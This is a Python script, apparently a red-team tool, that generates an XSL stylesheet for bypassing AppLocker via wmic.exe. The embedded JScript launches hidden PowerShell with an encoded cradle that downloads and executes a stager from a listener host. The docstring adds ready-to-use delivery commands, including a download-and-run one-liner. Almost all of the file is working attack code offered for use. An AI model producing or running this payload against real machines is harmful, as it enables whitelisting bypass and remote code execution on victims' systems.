#!/usr/bin/env python3
"""
gen_xsl.py — WMIC XSL AppLocker bypass payload generator

wmic.exe is in WINDIR/System32/wbem/ -- Microsoft-signed, always allowed
by AppLocker. The /format: flag loads an XSL stylesheet that can contain
JScript executed in the wmic.exe process.

Usage:
  python3 gen_xsl.py -l 10.0.0.1 -p 8888 -o evil.xsl

Deliver (remote — no file written to disk):
  wmic process get brief /format:"http://LHOST:PORT/evil.xsl"

Deliver (local):
  wmic process get brief /format:"C:\\path\\evil.xsl"

One-liner (download + run):
  $x="$env:TEMP\\u.xsl";(New-Object Net.WebClient).DownloadFile('http://LHOST/evil.xsl',$x);wmic process get brief /format:$x

Note: wmic.exe is deprecated in Win11 24H2 but still present and functional.
"""

import argparse
import base64
import os


def generate(stager_url: str, output_path: str = "evil.xsl") -> bool:
    ps_cmd = f"IEX(New-Object Net.WebClient).DownloadString('{stager_url}')"
    ps_enc = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()

    xsl = f"""<?xml version='1.0'?>
<stylesheet version="1.0"
 xmlns="http://www.w3.org/1999/XSL/Transform"
 xmlns:ms="urn:schemas-microsoft-com:xslt"
 xmlns:user="urn:user">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
  var r = new ActiveXObject("WScript.Shell").Run(
    "powershell.exe -NoP -NonI -W Hidden -Enc {ps_enc}",
    0, false
  );
  function main(){{}}
]]>
</ms:script>
<template match="/">
  <value-of select="user:main()"/>
</template>
</stylesheet>
"""

    with open(output_path, "w") as f:
        f.write(xsl)

    size = os.path.getsize(output_path)
    fname = os.path.basename(output_path)
    print(f"[+] XSL: {output_path} ({size} bytes)")
    print(f"[*] Remote:   wmic process get brief /format:\"http://LHOST:PORT/{fname}\"")
    print(f"[*] Local:    wmic process get brief /format:\"{output_path}\"")
    return True


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="WMIC XSL AppLocker bypass generator")
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--stager-url", help="Full URL to stager.ps1")
    g.add_argument("-l", "--lhost", help="Listener host")
    p.add_argument("-p", "--port", type=int, default=8888)
    p.add_argument("--stager-name", default="stager.ps1")
    p.add_argument("-o", "--output", default="evil.xsl")
    args = p.parse_args()

    url = args.stager_url or f"http://{args.lhost}:{args.port}/{args.stager_name}"
    generate(url, args.output)
